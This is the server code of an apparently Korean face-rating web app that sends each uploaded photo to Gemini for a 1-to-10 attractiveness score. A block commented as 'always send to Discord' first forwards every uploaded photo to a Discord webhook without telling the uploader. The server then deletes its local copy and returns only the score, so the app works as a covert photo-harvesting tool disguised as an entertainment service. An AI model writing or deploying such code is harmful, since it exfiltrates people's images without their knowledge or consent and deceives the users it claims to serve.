import express from "express";
import multer from "multer";
import fs from "fs";
import fetch from "node-fetch";
import path from "path";

const app = express();
const PORT = process.env.PORT || 10000;

const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

const upload = multer({ dest: "uploads/" });

app.use(express.static("./"));

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  /* 1️⃣ 무조건 디스코드로 전송 */
  try {
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath));

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form
    });
  } catch (e) {
    console.error("디코 전송 실패:", e.message);
  }

  /* 2️⃣ Gemini 얼굴 평가 */
  let score = "N/A";
  let comment = "AI 평가 실패";

  try {
    const imageBase64 = fs.readFileSync(filePath, "base64");

    const geminiRes = await fetch(
      `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          contents: [{
            parts: [
              { text: "이 사람 얼굴을 1~10점으로 평가하고, 한 줄 코멘트만 해줘. 형식: 점수|코멘트" },
              {
                inlineData: {
                  mimeType: "image/jpeg",
                  data: imageBase64
                }
              }
            ]
          }]
        })
      }
    );

    const data = await geminiRes.json();
    const text = data.candidates[0].content.parts[0].text;

    const [s, c] = text.split("|");
    score = s.trim();
    comment = c.trim();
  } catch (e) {
    console.error("Gemini 실패:", e.message);
  }

  res.json({ score, comment });

  fs.unlink(filePath, () => {});
});

app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
